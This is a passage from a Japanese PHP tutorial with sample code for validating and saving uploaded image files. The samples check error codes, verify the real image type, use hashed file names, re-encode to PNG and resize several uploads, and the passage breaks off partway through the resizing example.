	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="前書き" class="fragment"></span><a href="#%E5%89%8D%E6%9B%B8%E3%81%8D"><i class="fa fa-link"></i></a><strong>前書き</strong>
</h1>

<p>より一般化したものについては <strong><a href="http://qiita.com/mpyw/items/939964377766a54d4682" id="reference-9991f1d95538e50dc523">「ファイルアップロードの例外処理はこれぐらいしないと気が済まない」</a></strong> を参照。ここではそれを元に画像ファイルに限定して、いくつかのパターンで例を構成してみる。また、フォームの送信と受信を同一ファイルで行うとする。</p>

<h1>
<span id="サンプル集" class="fragment"></span><a href="#%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB%E9%9B%86"><i class="fa fa-link"></i></a><strong>サンプル集</strong>
</h1>

<h2>
<span id="1-exif_imagetype-関数を用いてチェックを行う" class="fragment"></span><a href="#1-exif_imagetype-%E9%96%A2%E6%95%B0%E3%82%92%E7%94%A8%E3%81%84%E3%81%A6%E3%83%81%E3%82%A7%E3%83%83%E3%82%AF%E3%82%92%E8%A1%8C%E3%81%86"><i class="fa fa-link"></i></a><strong>1. <a href="http://www.php.net/manual/ja/function.exif-imagetype.php" rel="nofollow noopener" target="_blank">exif_imagetype</a> 関数を用いてチェックを行う</strong>
</h2>

<p>これは、画像に関するMIMEタイプを整数として返す関数である。finfoクラスが使えない環境においても統一的にこちらの関数は使えるはず。但し、画像の形式を判別するために必要なだけのバイト数を読み込めない場合にエラーを発生するので、 <strong><a href="http://www.php.net/manual/ja/language.operators.errorcontrol.php" rel="nofollow noopener" target="_blank">エラー制御演算子</a> <code>@</code></strong> を用いて抑制する必要がある。以前ここでは <strong><a href="http://www.php.net/manual/ja/function.getimagesize.php" rel="nofollow noopener" target="_blank">getimagesize</a></strong> 関数を用いる手法を掲載していたが、こちらもマニュアルには記載されていないだけでエラーを発生するリスクを抱えていたので、抑制がいずれ必要となるならば…ということで一番動作が速いこの関数を採用することにした。</p>

<p><a href="https://camo.qiitausercontent.com/c6960cb1463372e05c6de5c263a1e0a6f8e6fb68/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f32396133306430632d303337612d383735342d616462342d6465393133386337653837382e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/c6960cb1463372e05c6de5c263a1e0a6f8e6fb68/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f32396133306430632d303337612d383735342d616462342d6465393133386337653837382e706e67" alt="ss (2014-04-05 at 08.36.35).png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/29a30d0c-037a-8754-adb4-de9138c7e878.png"></a></p>

<p>なお、この定数から実際の文字列形式の <strong>MIMEタイプ</strong> や <strong>拡張子</strong> を得るための関数も用意されている。</p>

<ul>
<li><strong><a href="http://www.php.net/manual/ja/function.image-type-to-mime-type.php" rel="nofollow noopener" target="_blank">PHP Manual - image_type_to_mime_type</a></strong></li>
<li><strong><a href="http://www.php.net/manual/ja/function.image-type-to-extension.php" rel="nofollow noopener" target="_blank">PHP Manual - image_type_to_extension</a></strong></li>
</ul>

<div class="code-frame" data-lang="html+php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'error'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">is_int</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'error'</span><span class="p">]))</span> <span class="p">{</span>

    <span class="k">try</span> <span class="p">{</span>

        <span class="c1">// $_FILES['upfile']['error'] の値を確認</span>
        <span class="k">switch</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'error'</span><span class="p">])</span> <span class="p">{</span>
            <span class="k">case</span> <span class="nx">UPLOAD_ERR_OK</span><span class="o">:</span> <span class="c1">// OK</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="k">case</span> <span class="nx">UPLOAD_ERR_NO_FILE</span><span class="o">:</span>   <span class="c1">// ファイル未選択</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'ファイルが選択されていません'</span><span class="p">);</span>
            <span class="k">case</span> <span class="nx">UPLOAD_ERR_INI_SIZE</span><span class="o">:</span>  <span class="c1">// php.ini定義の最大サイズ超過</span>
            <span class="k">case</span> <span class="nx">UPLOAD_ERR_FORM_SIZE</span><span class="o">:</span> <span class="c1">// フォーム定義の最大サイズ超過</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'ファイルサイズが大きすぎます'</span><span class="p">);</span>
            <span class="k">default</span><span class="o">:</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'その他のエラーが発生しました'</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="c1">// $_FILES['upfile']['mime']の値はブラウザ側で偽装可能なので、MIMEタイプを自前でチェックする</span>
        <span class="nv">$type</span> <span class="o">=</span> <span class="o">@</span><span class="nb">exif_imagetype</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">]);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$type</span><span class="p">,</span> <span class="p">[</span><span class="nx">IMAGETYPE_GIF</span><span class="p">,</span> <span class="nx">IMAGETYPE_JPEG</span><span class="p">,</span> <span class="nx">IMAGETYPE_PNG</span><span class="p">],</span> <span class="k">true</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'画像形式が未対応です'</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="c1">// ファイルデータからSHA-1ハッシュを取ってファイル名を決定し、ファイルを保存する</span>
        <span class="nv">$path</span> <span class="o">=</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">'./uploads/%s%s'</span><span class="p">,</span> <span class="nb">sha1_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">]),</span> <span class="nb">image_type_to_extension</span><span class="p">(</span><span class="nv">$type</span><span class="p">));</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">],</span> <span class="nv">$path</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'ファイル保存時にエラーが発生しました'</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nb">chmod</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span> <span class="mo">0644</span><span class="p">);</span>

        <span class="nv">$msg</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'green'</span><span class="p">,</span> <span class="s1">'ファイルは正常にアップロードされました'</span><span class="p">];</span>

    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">RuntimeException</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>

        <span class="nv">$msg</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'red'</span><span class="p">,</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">()];</span>

    <span class="p">}</span>

<span class="p">}</span>

<span class="c1">// XHTMLとしてブラウザに認識させる</span>
<span class="c1">// (IE8以下はサポート対象外ｗ)</span>
<span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: application/xhtml+xml; charset=utf-8'</span><span class="p">);</span>

<span class="cp">?&gt;</span>
<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span> <span class="na">xmlns</span><span class="o">=</span><span class="s">"http://www.w3.org/1999/xhtml"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>画像アップロード<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$msg</span><span class="p">))</span><span class="o">:</span> <span class="cp">?&gt;</span>
  <span class="p">&lt;</span><span class="nt">fieldset</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">legend</span><span class="p">&gt;</span>結果<span class="p">&lt;/</span><span class="nt">legend</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">span</span> <span class="na">style</span><span class="o">=</span><span class="s">"color:</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$msg</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="cp">?&gt;</span><span class="s">;"</span><span class="p">&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$msg</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">fieldset</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">endif</span><span class="p">;</span> <span class="cp">?&gt;</span>
  <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"multipart/form-data"</span> <span class="na">method</span><span class="o">=</span><span class="s">"post"</span> <span class="na">action</span><span class="o">=</span><span class="s">""</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">fieldset</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">legend</span><span class="p">&gt;</span>画像ファイルを選択(GIF, JPEG, PNGのみ対応)<span class="p">&lt;/</span><span class="nt">legend</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"file"</span> <span class="na">name</span><span class="o">=</span><span class="s">"upfile"</span> <span class="p">/&gt;&lt;</span><span class="nt">br</span> <span class="p">/&gt;</span>
      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">value</span><span class="o">=</span><span class="s">"送信"</span> <span class="p">/&gt;</span>
    <span class="p">&lt;/</span><span class="nt">fieldset</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</pre></div></div>

<p>もしファイルではなく <code>$data</code> に文字列として保持しているデータをチェックしたい場合、以下のようにする。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="o">@</span><span class="nb">exif_imagetype</span><span class="p">(</span>
    <span class="s1">'data://application/octet-stream;base64,'</span> <span class="o">.</span>
    <span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span>
<span class="p">)</span>
</pre></div></div>

<h2>
<span id="2-imagecreatefromstring-関数から全てpngとして保存する" class="fragment"></span><a href="#2-imagecreatefromstring-%E9%96%A2%E6%95%B0%E3%81%8B%E3%82%89%E5%85%A8%E3%81%A6png%E3%81%A8%E3%81%97%E3%81%A6%E4%BF%9D%E5%AD%98%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a><strong>2. <a href="http://www.php.net/manual/ja/function.imagecreatefromstring.php" rel="nofollow noopener" target="_blank">imagecreatefromstring</a> 関数から全てPNGとして保存する</strong>
</h2>

<p>環境によって差があるが、PHPのGDライブラリは <code>GIF</code> <code>JPEG</code> <code>PNG</code> に加えて <code>BMP</code> <code>XPM</code> に対応している場合もある。ここではこれら全てを自動判別できる <strong><a href="http://www.php.net/manual/ja/function.imagecreatefromstring.php" rel="nofollow noopener" target="_blank">imagecreatefromstring</a></strong> 関数を利用する。この関数はリソース生成失敗時にエラーを発生するため、1番目の例と同様に <strong><a href="http://www.php.net/manual/ja/language.operators.errorcontrol.php" rel="nofollow noopener" target="_blank">エラー制御演算子</a> <code>@</code></strong> を用いて抑制する必要がある。</p>

<div class="code-frame" data-lang="html+php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'error'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">is_int</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'error'</span><span class="p">]))</span> <span class="p">{</span>

    <span class="k">try</span> <span class="p">{</span>

        <span class="c1">// $_FILES['upfile']['error'] の値を確認</span>
        <span class="k">switch</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'error'</span><span class="p">])</span> <span class="p">{</span>
            <span class="k">case</span> <span class="nx">UPLOAD_ERR_OK</span><span class="o">:</span> <span class="c1">// OK</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="k">case</span> <span class="nx">UPLOAD_ERR_NO_FILE</span><span class="o">:</span>   <span class="c1">// ファイル未選択</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'ファイルが選択されていません'</span><span class="p">);</span>
            <span class="k">case</span> <span class="nx">UPLOAD_ERR_INI_SIZE</span><span class="o">:</span>  <span class="c1">// php.ini定義の最大サイズ超過</span>
            <span class="k">case</span> <span class="nx">UPLOAD_ERR_FORM_SIZE</span><span class="o">:</span> <span class="c1">// フォーム定義の最大サイズ超過</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'ファイルサイズが大きすぎます'</span><span class="p">);</span>
            <span class="k">default</span><span class="o">:</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'その他のエラーが発生しました'</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="c1">// GD画像リソースの生成を試みる</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$img</span> <span class="o">=</span> <span class="o">@</span><span class="nb">imagecreatefromstring</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">])))</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'有効な画像ファイルを指定してください'</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="c1">// ファイルデータからSHA-1ハッシュを取ってファイル名を決定し、保存する</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">imagepng</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">'./uploads/%s.png'</span><span class="p">,</span> <span class="nb">sha1_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">]))))</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'ファイル保存時にエラーが発生しました'</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="nv">$msg</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'green'</span><span class="p">,</span> <span class="s1">'ファイルは正常にアップロードされました'</span><span class="p">];</span>

    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">RuntimeException</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>

        <span class="nv">$msg</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'red'</span><span class="p">,</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">()];</span>

    <span class="p">}</span>

    <span class="c1">// リソースを解放</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$img</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">is_resource</span><span class="p">(</span><span class="nv">$img</span><span class="p">))</span> <span class="p">{</span>
        <span class="nb">imagedestroy</span><span class="p">(</span><span class="nv">$img</span><span class="p">);</span>
    <span class="p">}</span>

<span class="p">}</span>

<span class="c1">// XHTMLとしてブラウザに認識させる</span>
<span class="c1">// (IE8以下はサポート対象外ｗ)</span>
<span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: application/xhtml+xml; charset=utf-8'</span><span class="p">);</span>

<span class="cp">?&gt;</span>
<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span> <span class="na">xmlns</span><span class="o">=</span><span class="s">"http://www.w3.org/1999/xhtml"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>画像アップロード<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$msg</span><span class="p">))</span><span class="o">:</span> <span class="cp">?&gt;</span>
  <span class="p">&lt;</span><span class="nt">fieldset</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">legend</span><span class="p">&gt;</span>結果<span class="p">&lt;/</span><span class="nt">legend</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">span</span> <span class="na">style</span><span class="o">=</span><span class="s">"color:</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$msg</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="cp">?&gt;</span><span class="s">;"</span><span class="p">&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$msg</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">fieldset</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">endif</span><span class="p">;</span> <span class="cp">?&gt;</span>
  <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"multipart/form-data"</span> <span class="na">method</span><span class="o">=</span><span class="s">"post"</span> <span class="na">action</span><span class="o">=</span><span class="s">""</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">fieldset</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">legend</span><span class="p">&gt;</span>画像ファイルを選択<span class="p">&lt;/</span><span class="nt">legend</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"file"</span> <span class="na">name</span><span class="o">=</span><span class="s">"upfile"</span> <span class="p">/&gt;&lt;</span><span class="nt">br</span> <span class="p">/&gt;</span>
      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">value</span><span class="o">=</span><span class="s">"送信"</span> <span class="p">/&gt;</span>
    <span class="p">&lt;/</span><span class="nt">fieldset</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</pre></div></div>

<h2>
<span id="3-複数の画像ファイルを受け取ってそれぞれリサイズして保存する" class="fragment"></span><a href="#3-%E8%A4%87%E6%95%B0%E3%81%AE%E7%94%BB%E5%83%8F%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%82%92%E5%8F%97%E3%81%91%E5%8F%96%E3%81%A3%E3%81%A6%E3%81%9D%E3%82%8C%E3%81%9E%E3%82%8C%E3%83%AA%E3%82%B5%E3%82%A4%E3%82%BA%E3%81%97%E3%81%A6%E4%BF%9D%E5%AD%98%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a><strong>3. 複数の画像ファイルを受け取ってそれぞれリサイズして保存する</strong>
</h2>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"file"</span> <span class="na">name</span><span class="o">=</span><span class="s">"upfile[]"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"file"</span> <span class="na">name</span><span class="o">=</span><span class="s">"upfile[]"</span><span class="p">&gt;</span>
</pre></div></div>

<p>のように受け取った時、例えば各項目の <code>error</code> は</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s1">'error'</span><span class="p">]</span>
<span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="mi">1</span><span class="p">][</span><span class="s1">'error'</span><span class="p">]</span>
</pre></div></div>

<p>になると思われがちだが、実際には</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'error'</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
<span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'error'</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span>
</pre></div></div>

<p>となることに要注意。なお、ここでは実際にサイズ取得が必要なので <strong><a href="http://www.php.net/manual/ja/function.getimagesize.php" rel="nofollow noopener" target="_blank">getimagesize</a></strong> 関数を利用することにする。</p>

<div class="code-frame" data-lang="html+php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'error'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">is_array</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'error'</span><span class="p">]))</span> <span class="p">{</span>

    <span class="c1">// 各ファイルをチェック</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'error'</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&gt;</span> <span class="nv">$error</span><span class="p">)</span> <span class="p">{</span>

        <span class="k">try</span> <span class="p">{</span>

            <span class="c1">// 更に配列がネストしていれば不正とする</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_int</span><span class="p">(</span><span class="nv">$error</span><span class="p">))</span> <span class="p">{</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s2">"[</span><span class="si">{</span><span class="nv">$k</span><span class="si">}</span><span class="s2">] パラメータが不正です"</span><span class="p">);</span>
            <span class="p">}</span>

            <span class="c1">// $_FILES['upfile']['error'][$k] の値を確認</span>
            <span class="k">switch</span> <span class="p">(</span><span class="nv">$error</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">case</span> <span class="nx">UPLOAD_ERR_OK</span><span class="o">:</span> <span class="c1">// OK</span>
                    <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="nx">UPLOAD_ERR_NO_FILE</span><span class="o">:</span>   <span class="c1">// ファイル未選択</span>
                    <span class="k">continue</span> <span class="mi">2</span><span class="p">;</span>
                <span class="k">case</span> <span class="nx">UPLOAD_ERR_INI_SIZE</span><span class="o">:</span>  <span class="c1">// php.ini定義の最大サイズ超過</span>
                <span class="k">case</span> <span class="nx">UPLOAD_ERR_FORM_SIZE</span><span class="o">:</span> <span class="c1">// フォーム定義の最大サイズ超過</span>
                    <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s2">"[</span><span class="si">{</span><span class="nv">$k</span><span class="si">}</span><span class="s2">] ファイルサイズが大きすぎます"</span><span class="p">);</span>
                <span class="k">default</span><span class="o">:</span>
                    <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s2">"[</span><span class="si">{</span><span class="nv">$k</span><span class="si">}</span><span class="s2">] その他のエラーが発生しました"</span><span class="p">);</span>
            <span class="p">}</span>

            <span class="c1">// $_FILES['upfile']['mime']の値はブラウザ側で偽装可能なので</span>
            <span class="c1">// MIMEタイプを自前でチェックする</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$info</span> <span class="o">=</span> <span class="o">@</span><span class="nb">getimagesize</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">][</span><span class="nv">$k</span><span class="p">]))</span> <span class="p">{</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s2">"[</span><span class="si">{</span><span class="nv">$k</span><span class="si">}</span><span class="s2">] 有効な画像ファイルを指定してください"</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$info</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="p">[</span><span class="nx">IMAGETYPE_GIF</span><span class="p">,</span> <span class="nx">IMAGETYPE_JPEG</span><span class="p">,</span> <span class="nx">IMAGETYPE_PNG</span><span class="p">],</span> <span class="k">true</span><span class="p">))</span> <span class="p">{</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s2">"[</span><span class="si">{</span><span class="nv">$k</span><span class="si">}</span><span class="s2">] 未対応の画像形式です"</span><span class="p">);</span>
            <span class="p">}</span>

            <span class="c1">// 画像処理に使う関数名を決定する</span>
            <span class="nv">$create</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="s1">'createfrom'</span><span class="p">,</span> <span class="nv">$info</span><span class="p">[</span><span class="s1">'mime'</span><span class="p">]);</span>
            <span class="nv">$output</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$info</span><span class="p">[</span><span class="s1">'mime'</span><span class="p">]);</span>

            <span class="c1">// 縦横比を維持したまま 120 * 120 以下に収まるサイズを求める</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$info</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="nv">$info</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="p">{</span>
                <span class="nv">$dst_w</span> <span class="o">=</span> <span class="mi">120</span><span class="p">;</span>
                <span class="nv">$dst_h</span> <span class="o">=</span> <span class="nb">ceil</span><span class="p">(</span><span class="mi">120</span> <span class="o">*</span> <span class="nv">$info</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">/</span> <span class="nb">max</span><span class="p">(</span><span class="nv">$info</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">1</span><span class="p">));</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="nv">$dst_w</span> <span class="o">=</span> <span class="nb">ceil</span><span class="p">(</span><span class="mi">120</span> <span class="o">*</span> <span class="nv">$info</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">/</span> <span class="nb">max</span><span class="p">(</span><span class="nv">$info</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">1</span><span class="p">));</span>
                <span class="nv">$dst_h</span> <span class="o">=</span> <span class="mi">120</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="c1">// 元画像リソースを生成する</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$src</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$create</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">][</span><span class="nv">$k</span><span class="p">]))</span> <span class="p">{</span>
